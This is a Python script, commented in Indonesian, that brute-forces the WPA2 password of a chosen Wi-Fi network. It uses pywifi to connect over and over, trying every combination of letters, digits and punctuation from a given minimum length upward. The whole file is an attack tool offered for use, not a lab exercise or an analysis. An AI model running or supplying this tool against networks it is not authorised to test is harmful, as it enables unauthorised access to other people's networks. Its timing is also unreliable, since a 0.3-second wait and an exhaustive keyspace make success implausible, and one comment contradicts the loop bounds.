#creator: Abdurrahman Nurhakim

import pywifi
from pywifi import const
import itertools
import string
import time

# Set karakter yang bisa digunakan dalam brute force
characters = string.ascii_letters + string.digits + string.punctuation

def check_interfaces():
    """
    Fungsi untuk memeriksa antarmuka WiFi yang tersedia
    """
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    print("Antarmuka yang terdeteksi:")
    for i, iface in enumerate(interfaces):
        print(f"{i}: {iface.name()}")

def disconnect_all_wifi(iface):
    """
    Fungsi untuk memutuskan semua koneksi WiFi sebelum memulai brute force
    """
    iface.disconnect()
    if iface.status() == const.IFACE_DISCONNECTED:
        print("[*] Semua koneksi WiFi telah diputus.")
    else:
        print("[!] Gagal memutuskan koneksi sebelumnya.")

def validate_wifi_password(iface, ssid, password):
    """
    Fungsi untuk memvalidasi password WiFi menggunakan pywifi
    """
    # Pastikan interface terputus sebelum mencoba koneksi baru
    disconnect_all_wifi(iface)

    # Periksa apakah antarmuka WiFi benar-benar terputus
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = password
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        print(f"[*] Mencoba password: {password}")

        # Coba untuk terhubung dengan profil sementara ini
        iface.connect(tmp_profile)

        # Berikan jeda waktu yang cukup untuk koneksi
        time.sleep(0.3)

        # Periksa status koneksi
        if iface.status() == const.IFACE_CONNECTED:
            print(f"Password WiFi valid: {password}")
            iface.disconnect()
            return True
        else:
            print(f"Password WiFi salah: {password}")
            iface.disconnect()
            return False
    else:
        print("Gagal memutuskan koneksi sebelumnya.")
        return False

def brute_force_guess(iface, ssid, range_min):
    """
    Fungsi brute force untuk mencoba berbagai kombinasi password
    """
    disconnect_all_wifi(iface)  # Pastikan tidak ada koneksi aktif

    # Mulai menebak dengan panjang kata dari 8 hingga 20 karakter
    for word_length in range(range_min, 30):
        print(f"Menebak kata dengan panjang {word_length}...")

        # Buat semua kombinasi karakter dengan panjang word_length
        for guess in itertools.product(characters, repeat=word_length):
            guess_word = ''.join(guess)
            password = guess_word

            if validate_wifi_password(iface, ssid, password):
                return True, password

    print("Kata sandi tidak ditemukan.")
    return False, ""

if __name__ == "__main__":
    # Tampilkan antarmuka yang terdeteksi
    check_interfaces()

    # Pilih antarmuka WiFi yang benar (misalnya wlan0 atau wlp3s0)
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[1]  # Sesuaikan dengan antarmuka yang benar (menggunakan antarmuka ke-2)

    ssid = input("Masukkan nama WiFi (SSID): ")
    range_input = input("Masukan perkiraan jumlah karakter: ")
    range_min = int(range_input)

    # Loop percobaan koneksi brute force
    status, password = brute_force_guess(iface, ssid, range_min)
    if status:
        print(f"Berhasil terhubung dengan password: {password}")
    else:
        print("Password tidak ditemukan.")
